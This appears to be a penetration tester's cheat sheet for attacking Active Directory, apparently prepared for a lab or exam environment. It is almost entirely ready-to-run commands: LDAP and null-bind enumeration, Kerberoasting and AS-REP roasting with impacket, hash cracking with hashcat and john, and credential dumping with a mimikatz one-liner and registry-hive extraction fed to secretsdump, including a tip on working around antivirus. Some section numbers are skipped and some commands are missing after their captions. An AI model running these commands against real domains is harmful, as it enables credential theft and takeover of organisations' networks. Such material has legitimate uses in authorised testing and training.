1 · Get users & enumerate

LDAP enumeration

Base-DN dump — IP + base DN both live from the config panel

ldapsearch -x -H ldap://$DC -b "$BASEDN"

No base DN yet? Discover it for free

ldapsearch -x -H ldap://$DC -s base -b "" namingContexts

Unconstrained-delegation accounts — any of these is worth coercing a DA auth onto

ldapsearch -x -H ldap://$DC -D '$USER@$DOMAIN' -w '$PASS' -b "<base-dn>" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName

Who's actually in Domain Admins right now

ldapsearch -x -H ldap://$DC -D '$USER@$DOMAIN' -w '$PASS' -b "<base-dn>" "(&(objectClass=group)(cn=Domain Admins))" member

Null bind — often still works; --users also prints each description field (classic spot for a leaked password)

nxc ldap $DC -u '' -p '' --users

Real creds? Whole domain in one shot

...then open the .html reports it writes, not the raw json/grep — same data, way easier to read

GenericWrite/Self on a group — add yourself directly:

2 · Kerberoast & AS-REP

Fix clock skew

faketime (preferred)

Kerberos fails past ~5 min drift. Don't set the system clock — it drops the VPN and your ligolo tunnel. Wrap the Kerberos command in faketime with the DC's time instead; rdate -n -p only PRINTS the time, it never sets it:

faketime "$(rdate -n -p $DC | awk '{print $2, $3, $4, $5, $6}')" <your Kerberos command>

Measure the drift if you want

nmap -sU -p123 --script ntp-info $DC
▸Fallback — set the system clock (last resort; drops VPN/ligolo)
Clock skew

Kerberos fails hard past ~5 min drift — fix it before anything below:

sudo timedatectl set-ntp off
sudo rdate -n $DC
kdestroy

No rdate? Check the skew manually, then set it by hand

nmap -sU -p123 --script ntp-info $DC
sudo date -s "2026-01-01T00:00:00"
kdestroy

Confirm nothing stale is cached, clear it, unset the env var

echo $KRB5CCNAME
rm -f /tmp/*.ccache
unset KRB5CCNAME

Kerberoasting

SPN accounts, via LDAP filter directly

ldapsearch -x -H ldap://$DC -D '$USER@$DOMAIN' -w '$PASS' -b "<base-dn>" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

...via impacket, straight to a crackable file

impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile kerberoast.txt

...via nxc instead

nxc ldap $DC -u '$USER' -p '$PASS' --kerberoasting kerberoast_nxc.txt

AS-REP roasting

Accounts with Kerberos pre-auth disabled, via LDAP filter

ldapsearch -x -H ldap://$DC -D '$USER@$DOMAIN' -w '$PASS' -b "<base-dn>" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName

Request their AS-REP hashes — no password needed, just valid usernames

impacket-GetNPUsers $DOMAIN/ -usersfile usernames.txt -no-pass -dc-ip $DC -outputfile asrep.txt

Crack the hashes

Crack: kerberoast hashes

hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

Crack: AS-REP hashes

hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

Crack: plain NT hashes

hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt

Same two, with john instead of hashcat

john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs kerberoast.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT nt_hashes.txt

5 · Privesc — dump everything

Dump credentials

mimikatz, one true one-liner — logon sessions, local SAM, LSA secrets (service-account passwords, machine account, DPAPI keys — this is where a plaintext service password like _SC_MonitorLK shows up), and cached domain logons, all in one pass:

mimikatz.exe "log mimikatz.log" "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "exit"

One module blocked by AV or errors out? mimikatz keeps running the rest of the chain regardless.

No mimikatz on the box, or AV's eating the whole thing? Same access level as above — reg save all three hives (SAM + SYSTEM give the local account hashes, SECURITY gives LSA secrets + cached domain logons), pull them to Kali, dump offline:

reg save hklm\sam sam.save
reg save hklm\system system.save
reg save hklm\security security.save

Pull all three back to Kali (same transfer pattern as Phase 2/8), then:

impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
